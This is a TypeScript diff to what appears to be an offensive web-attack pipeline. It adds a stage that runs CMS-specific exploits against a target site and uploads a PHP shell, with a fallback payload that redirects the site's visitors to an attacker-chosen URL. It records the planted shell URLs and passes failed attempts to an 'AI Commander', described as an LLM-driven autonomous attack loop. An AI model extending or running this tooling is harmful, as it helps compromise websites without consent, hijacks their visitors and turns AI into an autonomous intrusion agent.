@@ -30,6 +30,7 @@ import { runWpDbInjection, type WpDbInjectionConfig, type WpDbInjectionResult } 
 import { proxyPool } from "./proxy-pool";
 import { runShelllessAttacks, type ShelllessResult, type ShelllessConfig } from "./shellless-attack-engine";
 import { runAiCommander, type AiCommanderResult, type AiCommanderEvent } from "./ai-autonomous-engine";
+import { runNonWpExploits, type NonWpScanResult, type ExploitResult } from "./non-wp-exploits";
 
 // ═══════════════════════════════════════════════════════
 //  TYPES
@@ -124,6 +125,8 @@ export interface PipelineResult {
   emailSent?: boolean;
   // AI Target Analysis (Phase 0)
   aiTargetAnalysis?: AiTargetAnalysis | null;
+  // Non-WP exploit results
+  nonWpExploitResults?: NonWpScanResult | null;
   // AI Commander result
   aiCommanderResult?: {
     success: boolean;
@@ -2117,6 +2120,88 @@ export async function runUnifiedAttackPipeline(
     });
   }
 
+  // ═══ NON-WP CMS EXPLOITS — Targeted exploits for non-WordPress CMS ═══
+  let nonWpExploitResults: NonWpScanResult | null = null;
+  const detectedCms = (prescreen?.cms || vulnScan?.cms?.type || "").toLowerCase();
+  const isNonWpTarget = detectedCms && detectedCms !== "wordpress" && detectedCms !== "shopify" && detectedCms !== "wix" && detectedCms !== "squarespace";
+  const isGenericTarget = !detectedCms || detectedCms === "unknown" || detectedCms === "custom";
+  const hasVerifiedUploads = uploadedFiles.filter(f => f.verified).length > 0;
+
+  if (!hasVerifiedUploads && (isNonWpTarget || isGenericTarget)) {
+    onEvent({
+      phase: "shellless" as any,
+      step: "nonwp_exploits_start",
+      detail: `\u{1F50D} Non-WP Exploits \u0e40\u0e23\u0e34\u0e48\u0e21\u0e17\u0e33\u0e07\u0e32\u0e19 \u2014 \u0e2a\u0e41\u0e01\u0e19 CMS-specific vulnerabilities (${detectedCms || "generic"})...`,
+      progress: 93,
+    });
+
+    try {
+      const shellContent = shells[0]?.content;
+      const phpShellCode = (typeof shellContent === "string" ? shellContent : shellContent?.toString("utf-8")) || `<?php header("Location: ${config.redirectUrl}", true, 302); exit; ?>`;
+      nonWpExploitResults = await runNonWpExploits({
+        targetUrl: config.targetUrl,
+        cms: detectedCms || "unknown",
+        phpShellCode,
+        shellFileName: shells[0]?.filename || `cache-${Date.now()}.php`,
+        timeout: config.timeoutPerMethod || 15000,
+        onProgress: (method, detail) => {
+          onEvent({
+            phase: "shellless" as any,
+            step: `nonwp_${method}`,
+            detail: `\u{1F50D} [Non-WP] ${method}: ${detail}`,
+            progress: 94,
+          });
+        },
+      });
+
+      // Check for successful file uploads
+      const successfulUploads = nonWpExploitResults.results.filter(
+        r => r.success && (r.shellUrl || r.uploadedPath)
+      );
+
+      if (successfulUploads.length > 0) {
+        for (const exploit of successfulUploads) {
+          const exploitUrl = exploit.shellUrl || `${config.targetUrl}/${exploit.uploadedPath}`;
+          uploadedFiles.push({
+            url: exploitUrl,
+            shell: shells[0] || { filename: "nonwp-exploit", content: "", type: "php" as any, technique: exploit.method, obfuscation: "none" as any },
+            method: `nonwp_${exploit.method}`,
+            verified: true,
+            redirectWorks: false,
+            redirectDestinationMatch: false,
+            finalDestination: config.redirectUrl,
+            httpStatus: 200,
+          });
+        }
+        aiDecisions.push(`Non-WP Exploits SUCCESS: ${successfulUploads.map(e => e.method).join(", ")}`);
+        onEvent({
+          phase: "shellless" as any,
+          step: "nonwp_exploits_success",
+          detail: `\u2705 Non-WP Exploits \u0e2a\u0e33\u0e40\u0e23\u0e47\u0e08! ${successfulUploads.length} exploit(s) \u0e27\u0e32\u0e07\u0e44\u0e1f\u0e25\u0e4c\u0e44\u0e14\u0e49: ${successfulUploads.map(e => `${e.method} (${e.severity})`).join(", ")}`,
+          progress: 95,
+          data: nonWpExploitResults,
+        });
+      } else {
+        const findings = nonWpExploitResults.results.filter(r => r.success);
+        aiDecisions.push(`Non-WP Exploits: ${findings.length} findings, 0 file uploads`);
+        onEvent({
+          phase: "shellless" as any,
+          step: "nonwp_exploits_done",
+          detail: `\u{1F4CB} Non-WP Exploits: ${findings.length} vulnerabilities found, no file upload \u2014 \u0e2a\u0e48\u0e07\u0e15\u0e48\u0e2d\u0e43\u0e2b\u0e49 AI Commander`,
+          progress: 95,
+        });
+      }
+    } catch (error: any) {
+      errors.push(`Non-WP exploits error: ${error.message}`);
+      onEvent({
+        phase: "shellless" as any,
+        step: "nonwp_exploits_error",
+        detail: `\u26A0\uFE0F Non-WP exploits error: ${error.message}`,
+        progress: 95,
+      });
+    }
+  }
+
   // ═══ AI COMMANDER — LLM-Driven Autonomous Attack Loop ═══
   // Last resort: if ALL methods failed, let AI Commander try autonomously
   let aiCommanderResult: AiCommanderResult | null = null;
@@ -2263,6 +2348,8 @@ export async function runUnifiedAttackPipeline(
     cdnUploadResult: cdnUploadResult || undefined,
     // AI Target Analysis (Phase 0)
     aiTargetAnalysis: aiTargetAnalysis || undefined,
+    // Non-WP exploit results
+    nonWpExploitResults: nonWpExploitResults || undefined,
     // AI Commander result
     aiCommanderResult: aiCommanderResult ? {
       success: aiCommanderResult.success,
